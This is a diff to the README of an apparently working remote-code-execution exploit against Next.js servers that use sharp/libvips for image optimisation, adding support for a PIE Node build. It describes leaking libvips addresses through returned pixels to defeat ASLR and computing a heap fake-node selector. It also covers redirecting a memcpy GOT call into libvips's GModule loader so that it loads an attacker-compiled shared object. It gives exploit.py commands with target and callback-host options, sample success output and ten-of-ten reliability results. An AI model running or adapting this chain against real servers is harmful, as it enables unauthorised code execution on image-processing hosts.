@@ -15,9 +15,10 @@ The exploit uses only the target's HTTP upload and image-optimization routes:
    pixels with every exact libvips profile in the manifest.
 2. It proceeds only when one profile and one randomized libvips base are
    supported by all required independent anchors.
-3. It scans those same pixels for a complete heap record tied to the recovered
-   libvips base. The record must contain repeated peer pointers, an arena
-   sentinel, three libvips references and a bounded related-pointer delta.
+3. It resolves the two-byte fake-node selector using the selected profile. The
+   stock profile requires a complete marked heap record. The PIE profile uses
+   a verified allocator page-lane invariant and also records a marker-free
+   tail record when the response exposes one.
 4. It calculates a control target as the recovered libvips base plus the
    profile-verified internal `g_module_open_full` offset.
 5. On the attacker machine, it compiles a small shared object whose constructor
@@ -41,23 +42,40 @@ The libvips-relative validation cohort is recorded in
 All ten fresh processes returned valid `/usr/bin/id` output with ten distinct
 randomized libvips bases and ten independently derived loader addresses.
 
+The PIE acceptance cohort is recorded in
+[`evidence/libvips-gmodule-pie-rce-10x.json`](evidence/libvips-gmodule-pie-rce-10x.json).
+All ten fresh `ET_DYN` Node processes returned valid `/usr/bin/id` output. The
+cohort observed ten distinct randomized libvips bases. Six responses also
+contained the validating PIE tail record; the other four used the same
+profile-pinned page-lane invariant without pretending that a record was
+present.
+
 ## Tested stack
 
-- Node.js 25.8.1, non-PIE `ET_EXEC`
+- Node.js 25.8.1, PIE `ET_DYN`
+  - build ID `c52fa8d905d7eab79d16c17215f1618f1b8a4429`
+  - SHA-256 `4f068fde6d1856f5884072d086999e9ac82234139ddbd3157d15bd1c623e9f5c`
 - Next.js 15.5.23
 - sharp 0.34.4
 - bundled libvips 8.17.2
 - bundled libheif 1.20.2
 - Linux x86-64 with ASLR and NX enabled
 
-The end-to-end cohort uses the exact non-PIE Node 25.8.1 artifact above because
-the current heap relationship is profile-specific. The final control target,
-however, contains no fixed Node address. The profile pins the hidden GModule
-loader's libvips-relative offset and bytes, the `memcpy` relocation, and the
-heap relationships. It contains neither a fixed absolute loader address nor a
-fixed fake-node low word. The exploit fails closed when a profile is malformed,
-returned pixels do not select exactly one supported profile/base pair, or heap
-evidence does not produce one structurally supported selector.
+The PIE cohort uses the exact Node artifact above with ASLR and NX enabled. The
+chain does not need the randomized Node base: its control target is the hidden
+GModule loader inside libvips, whose randomized base is recovered from returned
+pixels. The profile pins that loader's libvips-relative offset and bytes, the
+`memcpy` relocation, and the allocator relationships. It contains no absolute
+code address and no literal fake-node selector. For the PIE build, the selector
+is calculated as the profile's `0x6000` page lane plus the signed `-0x690`
+fake-node relation, modulo 16 bits. The marker-free tail record independently
+corroborated this calculation in six of ten fresh processes.
+
+The exploit fails closed when a profile is malformed or returned pixels do not
+select exactly one supported profile/base pair. The stock profile additionally
+requires its complete returned heap record. A profile is an exact compatibility
+claim, so the operator should verify the target artifacts offline before using
+it.
 
 The loader ABI is important. The overwritten call supplies the library path in
 RDI, an image-row pointer in RSI, and the 58-byte copy length in RDX. The pinned
@@ -117,14 +135,14 @@ python3 exploit.py \
   --json-output result.json
 ```
 
-The exploit evaluates every profile in the manifest by default. To restrict
-classification to one exact supported stack, provide its ID explicitly:
+The default manifest describes the stock `ET_EXEC` lab. For the verified PIE
+artifact, select its separate strict manifest:
 
 ```bash
 python3 exploit.py \
   --target http://127.0.0.1:3000 \
   --callback-host 127.0.0.1 \
-  --profile node-25.8.1-sharp-0.34.4-linux-x64
+  --profile-manifest profiles/native_stack_profiles_pie.json
 ```
 
 For an authorised remote target, `--callback-host` must be an attacker IPv4
@@ -144,7 +162,7 @@ A successful result contains:
 ```json
 {
   "success": true,
-  "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+  "profile_id": "node-25.8.1-pie-sharp-0.34.4-linux-x64",
   "libvips_base": "0x7f1234400000",
   "control_target": {
     "module": "libvips",
@@ -160,6 +178,9 @@ A successful result contains:
   },
   "heap_calibration": {
     "derived_selector": "0x5970",
+    "selector_source": "profile_page_lane_and_returned_record",
+    "profile_candidate_selector": "0x5970",
+    "record_candidate_selectors": ["0x5970"],
     "minimum_observations": 1,
     "observations": [
       {
@@ -167,7 +188,8 @@ A successful result contains:
         "candidate_selectors": ["0x5970"],
         "matches": [
           {
-            "anchor": "0x7f00104f6e30",
+            "response_offset": "0xec658",
+            "anchor": "0x7f00104f6c30",
             "anchor_page": "0x7f00104f6000",
             "fake_node_delta_from_anchor_page": "-0x690",
             "derived_fake_node": "0x7f00104f5970"
@@ -176,9 +198,18 @@ A successful result contains:
       }
     ]
   },
+  "upload_contract": {
+    "calibration_donors": {"content_type": "image/avif"},
+    "callback_library": {
+      "filename": "x.jpg",
+      "remote_path": "uploads/x.jpg",
+      "content_type": "image/jpeg"
+    },
+    "payload": {"content_type": "image/avif"}
+  },
   "classification": {
     "selected_attempt": 4,
-    "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+    "selected_profile_id": "node-25.8.1-pie-sharp-0.34.4-linux-x64",
     "selected_base": "0x7f1234400000",
     "selected_anchors": [
       {"offset": "0x1be1b0", "value": "0x7f12345be1b0", "repetitions": 1},
@@ -230,11 +261,13 @@ profile's path field. The default `uploads/x.jpg` satisfies the pinned profile's
 ## Native-stack profiles
 
 [`profiles/native_stack_profiles.json`](profiles/native_stack_profiles.json)
-binds one exploit layout to exact artifacts and ABI measurements. The pinned
-profile identifies Node, Next.js, sharp, libvips, libheif, glibc and
-libstdc++, then records the libvips control helper, GOT relocation,
-returned-pointer anchors, forged red-black-tree/ImagePlane layout, heap-record
-relation, tile geometry and application paths.
+and
+[`profiles/native_stack_profiles_pie.json`](profiles/native_stack_profiles_pie.json)
+bind exploit layouts to exact artifacts and ABI measurements. Each profile
+identifies Node, Next.js, sharp, libvips, libheif, glibc and libstdc++, then
+records the libvips control helper, GOT relocation, returned-pointer anchors,
+forged red-black-tree/ImagePlane layout, heap relation, tile geometry and
+application paths.
 
 The runtime loader rejects unknown or missing fields, malformed numbers and
 digests, unsafe paths, and inconsistent geometry before making an HTTP request.
@@ -266,23 +299,23 @@ arena sentinel, heap pointers, libvips references, signed relation and derived
 selector. Earlier no-match attempts remain in the `classification.attempts`
 array for auditability.
 
-The heap calibrator does not trust a raw low word. A candidate must be inside
-a complete returned record containing the expected heap chunk size, a 64 MiB
-arena sentinel, paired heap pointers, three pointers relative to the already
-recovered libvips base and the declared marker. The profile selects the lowest
-complete record, normalises the selected anchor to its page, and applies the
-signed page-to-fake-node relation. This removes harmless sub-page allocator
-shifts from the calculation. The record itself supplies repeated heap-pointer
-observations and three independent libvips-relative checks. If no complete
-record exists, or multiple derived values independently reach the configured
-threshold, the exploit stops before it uploads either the callback library or
-the destructive AVIF.
+The heap selector has two explicit strategies. The stock profile uses
+`response_record`: a candidate must be inside a complete marked record with
+the expected chunk size, arena sentinel, paired heap pointers and three
+libvips-relative references. The PIE profile uses `profile_page_lane`: the
+two-byte selector is calculated from a version-pinned allocator page lane and
+the signed page-to-fake-node relation. A returned marker-free tail record can
+corroborate that value, but is not reliably present in every process. The
+10-process PIE cohort observed it in six lifetimes and still reached RCE in
+all ten. The JSON evidence distinguishes `profile_page_lane` from
+`profile_page_lane_and_returned_record` so the source is never overstated.
 
 Verify a local stack against every declared identity before using its profile:
 
 ```bash
 python3 tools/verify_profile_artifacts.py \
-  --node /home/research/.nvm/versions/node/v25.8.1/bin/node \
+  --manifest profiles/native_stack_profiles_pie.json \
+  --node /path/to/the/verified/pie/node \
   --libvips lab/node_modules/@img/sharp-libvips-linux-x64/lib/libvips-cpp.so.8.17.2 \
   --libc /usr/lib/x86_64-linux-gnu/libc.so.6 \
   --libstdcxx /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.35 \
@@ -301,7 +334,11 @@ Run the regression suite and fresh-process cohort with:
 
 ```bash
 python3 -m unittest discover -s tests -v
-python3 scripts/fresh_process_cohort.py --lifetimes 10
+python3 scripts/fresh_process_cohort.py \
+  --node /path/to/the/verified/pie/node \
+  --manifest profiles/native_stack_profiles_pie.json \
+  --lifetimes 10 \
+  --output evidence/libvips-gmodule-pie-rce-10x.json
 ```
 
 ## Repository layout
@@ -314,8 +351,9 @@ heap_calibrator.py                  repeated returned-pixel heap calibration
 rce_payload.py                     proven memcpy-GOT AVIF payload
 stack_profile.py                   strict native-stack profile loader
 profiles/native_stack_profiles.json exact supported artifact and ABI identity
+profiles/native_stack_profiles_pie.json exact PIE artifact and allocator profile
 tools/verify_profile_artifacts.py  offline exact-artifact verifier
-scripts/fresh_process_cohort.py    stock fresh-process validation harness
+scripts/fresh_process_cohort.py    fresh-process validation harness
 tests/                             strict-loader and exploit regressions
 tests/fixtures/                    exact cross-build returned-pixel evidence
 avif_grid.py                       lossless AV1 grid/ISO-BMFF generator
@@ -338,8 +376,9 @@ vtable and rb-tree-GOT experiments were intentionally excluded.
   directory can break the staging step.
 - The libvips offset applies only to the exact verified libvips artifact. The
   runtime address is always calculated from remotely returned pointers.
-- The low-16-bit plane-map redirection depends on a profile-specific returned
-  heap-record shape and anchor-page-to-fake-node relation.
+- The low-16-bit plane-map redirection depends on a profile-specific allocator
+  page lane and anchor-page-to-fake-node relation. Deployments with different
+  native artifacts or allocator layouts require a separately verified profile.
 - The PoC proves native execution by returning `/usr/bin/id` output; it does
   not provide an arbitrary command interface or attempt to keep the corrupted
   target process alive.
